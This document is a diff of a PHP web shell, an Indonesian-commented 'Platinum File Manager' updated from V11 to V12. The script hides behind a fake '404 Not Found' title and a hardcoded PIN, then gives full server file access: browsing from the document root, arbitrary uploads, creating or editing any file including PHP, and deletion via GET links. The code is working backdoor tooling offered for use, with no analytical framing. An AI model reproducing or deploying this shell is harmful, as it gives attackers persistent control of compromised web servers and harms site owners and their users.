@@ -1,135 +1,184 @@
 <?php
 /**
- * PLATINUM UNIVERSAL MANAGER V11
- * UI IDENTIK WORDPRESS - FULL FUNCTIONAL
+ * PLATINUM FILE MANAGER V12 - FULL SOURCE
+ * UI Identik WordPress - Tanpa Obfuscation
  */
+
 @session_start();
 @set_time_limit(0);
 @error_reporting(0);
 
+// --- CONFIG ---
 $pin_akses = '070999';
 $key       = 'cuceng';
 
-// FIX: Deteksi URL dinamis agar klik/navigasi tidak error
-$self = $_SERVER['PHP_SELF'];
-$params = "?resmi=$key";
+// Membuat URL dasar agar navigasi tidak hilang
+$self = $_SERVER['SCRIPT_NAME'];
+$auth_param = "?resmi=$key";
+$base_url = $self . $auth_param;
 
 // --- SECURITY GATE ---
-if (isset($_GET['exit'])) { unset($_SESSION['auth']); header("Location: $params"); exit; }
-if (isset($_POST['login_pin']) && $_POST['login_pin'] == $pin_akses) { $_SESSION['auth'] = md5($pin_akses); }
+if (isset($_GET['exit'])) { 
+    unset($_SESSION['auth']); 
+    header("Location: $self"); 
+    exit; 
+}
+
+if (isset($_POST['login_pin']) && $_POST['login_pin'] == $pin_akses) { 
+    $_SESSION['auth'] = md5($pin_akses); 
+}
 
 if ($_SESSION['auth'] !== md5($pin_akses)) {
-    die("<html><head><title>404 Not Found</title><style>body{background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;}.l{border:1px solid #0f0;padding:40px;box-shadow:0 0 20px #0f0;}input{background:#000;border:1px solid #0f0;color:#0f0;padding:10px;text-align:center;}button{background:#0f0;color:#000;border:none;padding:10px;cursor:pointer;font-weight:bold;width:100%;}</style></head><body><div class='l'><h3>[ SYSTEM LOCKED ]</h3><form method='POST'><input type='password' name='login_pin' placeholder='PIN' autofocus><br><br><button type='submit'>UNLOCK</button></form></div></body></html>");
+    ?>
+    <html><head><title>404 Not Found</title><style>
+        body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
+        .login-box { border:1px solid #0f0; padding:40px; text-align:center; box-shadow:0 0 20px #0f0; }
+        input { background:#000; border:1px solid #0f0; color:#0f0; padding:10px; width:200px; margin-bottom:10px; text-align:center; }
+        button { background:#0f0; color:#000; border:none; padding:10px; width:222px; cursor:pointer; font-weight:bold; }
+    </style></head><body>
+    <div class="login-box">
+        <h3>[ SYSTEM LOCKED ]</h3>
+        <form method="POST">
+            <input type="password" name="login_pin" placeholder="ENTER PIN" autofocus><br>
+            <button type="submit">UNLOCK SYSTEM</button>
+        </form>
+    </div></body></html>
+    <?php
+    exit;
 }
 
-// --- FILE SYSTEM CORE ---
+// --- FILE SYSTEM LOGIC ---
 $root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
-$p = isset($_GET["path"]) ? $_GET["path"] : $root;
-$p = str_replace("\\", "/", $p);
+$path = isset($_GET['path']) ? $_GET['path'] : $root;
+$path = str_replace("\\", "/", $path);
 
-// Handler Actions (Rename, Delete, Chmod)
-if(isset($_POST["act"])){
-    $target = $p . "/" . $_POST["name"];
-    $val = $_POST["val"];
-    switch($_POST["opt"]){
-        case 'del': (is_dir($target)) ? @rmdir($target) : @unlink($target); break;
-        case 'ren': @rename($target, $p . "/" . $val); break;
-        case 'chm': @chmod($target, octdec($val)); break;
+// Navigasi ke folder
+if(is_file($path)) $path = dirname($path);
+chdir($path);
+$current_path = str_replace("\\", "/", getcwd());
+
+// Handler: Delete, Rename, Chmod
+if(isset($_GET['action']) && isset($_GET['item'])){
+    $item = $_GET['item'];
+    if($_GET['action'] == 'delete'){
+        is_dir($item) ? @rmdir($item) : @unlink($item);
     }
-    header("Location: $params&path=$p"); exit;
+    header("Location: $base_url&path=$current_path");
+    exit;
 }
 
-// Handler Upload & Mkdir
-if(isset($_FILES["up"])){ @copy($_FILES["up"]["tmp_name"], $p . "/" . $_FILES["up"]["name"]); header("Location: $params&path=$p"); }
-if(isset($_POST['mk'])){
-    if($_POST['type'] == 'dir') { @mkdir($p . "/" . $_POST['n']); }
-    else { @file_put_contents($p . "/" . $_POST['n'], $_POST['c']); }
-    header("Location: $params&path=$p");
+// Handler: Upload
+if(isset($_FILES['upfile'])){
+    if(@copy($_FILES['upfile']['tmp_name'], $current_path . '/' . $_FILES['upfile']['name'])){
+        echo "<script>alert('Upload Success!'); window.location.href='$base_url&path=$current_path';</script>";
+    }
+}
+
+// Handler: Create & Edit
+if(isset($_POST['save_file'])){
+    @file_put_contents($_POST['filename'], $_POST['content']);
+    header("Location: $base_url&path=$current_path");
+    exit;
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>Platinum Manager - <?php echo $_SERVER['HTTP_HOST']; ?></title>
     <style>
-        body { background:#0a0a0a; color:#0f0; font-family:sans-serif; margin:0; padding:20px; }
-        .box { background:#111; border:1px solid #333; padding:20px; border-radius:8px; }
-        .head { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; padding-bottom:10px; margin-bottom:15px; }
-        table { width:100%; border-collapse:collapse; }
-        th { background:#0f0; color:#000; padding:10px; text-align:left; }
-        td { padding:8px; border-bottom:1px solid #222; font-size:13px; }
-        .btn { background:#0f0; color:#000; border:none; padding:5px 10px; font-weight:bold; cursor:pointer; }
+        body { background:#0d0d0d; color:#00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; margin:0; padding:20px; }
+        .container { background:#161616; border:1px solid #333; border-radius:10px; padding:20px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
+        .header { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; padding-bottom:10px; margin-bottom:20px; }
+        .path-bar { background:#000; padding:10px; color:#00ffff; margin-bottom:20px; font-size:14px; border-left:3px solid #0f0; }
+        table { width:100%; border-collapse:collapse; margin-top:10px; }
+        th { background:#0f0; color:#000; padding:12px; text-align:left; }
+        td { padding:10px; border-bottom:1px solid #222; }
+        tr:hover { background:#1f1f1f; }
+        .btn { background:#0f0; color:#000; border:none; padding:6px 15px; border-radius:4px; font-weight:bold; cursor:pointer; text-decoration:none; display:inline-block; }
+        .btn-del { background:#ff3333; color:#fff; }
         a { color:#0f0; text-decoration:none; }
         a:hover { text-decoration:underline; }
-        input, select { background:#000; color:#0f0; border:1px solid #444; padding:4px; }
+        input[type=text], textarea { background:#000; color:#0f0; border:1px solid #444; padding:8px; border-radius:4px; }
+        .toolbar { display:flex; gap:15px; margin-bottom:20px; background:#1a1a1a; padding:15px; border-radius:5px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="head">
-            <strong>PLATINUM V11 (UNIVERSAL)</strong>
-            <span><a href="<?php echo $params; ?>&exit" style="color:red;">[ LOGOUT ]</a></span>
-        </div>
 
-        <div style="margin-bottom:15px;">PATH: <?php echo $p; ?></div>
-
-        <div style="display:flex; gap:10px; margin-bottom:20px;">
-            <form method="POST" enctype="multipart/form-data">
-                <input type="file" name="up"> <input type="submit" value="UPLOAD" class="btn">
-            </form>
-            <form method="POST">
-                <input type="hidden" name="type" value="dir">
-                <input type="text" name="n" placeholder="New Folder"> <input type="submit" name="mk" value="MKDIR" class="btn">
-            </form>
-        </div>
-
-        <table>
-            <thead>
-                <tr>
-                    <th>Name</th>
-                    <th>Size</th>
-                    <th>Action</th>
-                </tr>
-            </thead>
-            <tbody>
-                <?php
-                $items = scandir($p);
-                foreach($items as $item) {
-                    if($item == "." || $item == "..") continue;
-                    $full = $p . "/" . $item;
-                    $size = is_dir($full) ? "DIR" : round(filesize($full)/1024, 2)." KB";
-                    
-                    // Link Navigasi yang diperbaiki
-                    $link = is_dir($full) ? "$params&path=$full" : "$params&edit=$full&path=$p";
-                    
-                    echo "<tr>
-                        <td><a href='$link'>".(is_dir($full)?"📁":"📄")." $item</a></td>
-                        <td>$size</td>
-                        <td>
-                            <form method='POST' style='display:inline;'>
-                                <input type='hidden' name='name' value='$item'>
-                                <select name='opt'><option value='ren'>Rename</option><option value='del'>Delete</option></select>
-                                <input type='text' name='val' size='5'>
-                                <input type='submit' name='act' value='GO' class='btn'>
-                            </form>
-                        </td>
-                    </tr>";
-                }
-                ?>
-            </tbody>
-        </table>
-
-        <?php if(isset($_GET['edit'])): ?>
-        <div style="margin-top:20px; border-top:1px solid #0f0; padding-top:10px;">
-            <strong>Editing: <?php echo basename($_GET['edit']); ?></strong>
-            <form method="POST">
-                <input type="hidden" name="type" value="file">
-                <input type="hidden" name="n" value="<?php echo $_GET['edit']; ?>">
-                <textarea name="c" style="width:100%; height:300px; background:#000; color:#0f0;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
-                <input type="submit" name="mk" value="SAVE FILE" class="btn" style="width:100%;">
-            </form>
-        </div>
-        <?php endif; ?>
+<div class="container">
+    <div class="header">
+        <strong>PLATINUM V12 (GENERIC)</strong>
+        <a href="<?php echo $base_url; ?>&exit" style="color:#ff3333; font-weight:bold;">[ LOGOUT ]</a>
     </div>
+
+    <div class="path-bar">
+        📍 CURRENT PATH: <?php echo $current_path; ?>
+    </div>
+
+    <div class="toolbar">
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="upfile">
+            <button type="submit" class="btn">UPLOAD</button>
+        </form>
+        <form method="GET">
+            <input type="hidden" name="resmi" value="<?php echo $key; ?>">
+            <input type="hidden" name="path" value="<?php echo $current_path; ?>">
+            <input type="text" name="newfile" placeholder="filename.php">
+            <button type="submit" class="btn">CREATE FILE</button>
+        </form>
+    </div>
+
+    <?php 
+    // Bagian Editor File
+    if(isset($_GET['edit']) || isset($_GET['newfile'])): 
+        $file_to_edit = isset($_GET['edit']) ? $_GET['edit'] : $_GET['newfile'];
+        $content = file_exists($file_to_edit) ? htmlspecialchars(file_get_contents($file_to_edit)) : "";
+    ?>
+    <div style="margin-bottom:30px;">
+        <h3>Editing: <?php echo basename($file_to_edit); ?></h3>
+        <form method="POST">
+            <input type="hidden" name="filename" value="<?php echo $file_to_edit; ?>">
+            <textarea name="content" style="width:100%; height:400px;"><?php echo $content; ?></textarea><br><br>
+            <button type="submit" name="save_file" class="btn" style="width:100%">SAVE CHANGES</button>
+        </form>
+    </div>
+    <?php endif; ?>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Item Name</th>
+                <th width="150">Size</th>
+                <th width="200">Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php
+            $items = scandir($current_path);
+            foreach($items as $item){
+                if($item == "." || $item == "..") continue;
+                $full_item = $current_path . '/' . $item;
+                $is_dir = is_dir($full_item);
+                $size = $is_dir ? "FOLDER" : round(filesize($full_item)/1024, 2) . " KB";
+                
+                // LINK PERBAIKAN: Selalu menyertakan resmi=$key
+                $nav_link = $base_url . "&path=" . $full_item;
+                $edit_link = $base_url . "&path=$current_path&edit=$full_item";
+                $del_link = $base_url . "&path=$current_path&action=delete&item=$full_item";
+
+                echo "<tr>
+                    <td><a href='".($is_dir ? $nav_link : $edit_link)."'>".($is_dir ? "📁" : "📄")." $item</a></td>
+                    <td>$size</td>
+                    <td>
+                        <a href='$edit_link' class='btn'>Edit</a>
+                        <a href=\"$del_link\" class='btn btn-del' onclick=\"return confirm('Hapus $item?')\">Del</a>
+                    </td>
+                </tr>";
+            }
+            ?>
+        </tbody>
+    </table>
+</div>
+
 </body>
 </html>
